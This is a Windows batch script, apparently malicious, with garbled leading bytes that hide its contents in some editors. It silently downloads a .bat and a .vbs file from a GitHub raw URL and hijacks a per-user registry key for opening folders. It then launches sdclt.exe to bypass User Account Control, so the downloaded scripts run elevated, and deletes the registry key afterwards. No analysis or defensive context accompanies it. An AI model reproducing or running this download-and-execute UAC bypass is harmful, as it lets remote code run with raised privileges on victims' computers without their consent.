��&cls
@echo off
powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ostajic/CodingFolder/master/run4.bat' -OutFile '%userprofile%\Downloads\run4.bat'" >nul 2>&1
powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/ostajic/CodingFolder/master/run3.vbs' -OutFile '%userprofile%\Downloads\run3.vbs'" >nul 2>&1
reg add "HKCU\Software\Classes\Folder\shell\open\command" /d "cmd.exe /c %userprofile%\Downloads\run3.vbs %userprofile%\Downloads\run4.bat" /f && reg add HKCU\Software\Classes\Folder\shell\open\command /v "DelegateExecute" /f >nul 2>&1
%windir%\system32\sdclt.exe
pause
reg delete "HKCU\Software\Classes\Folder\shell\open\command" /f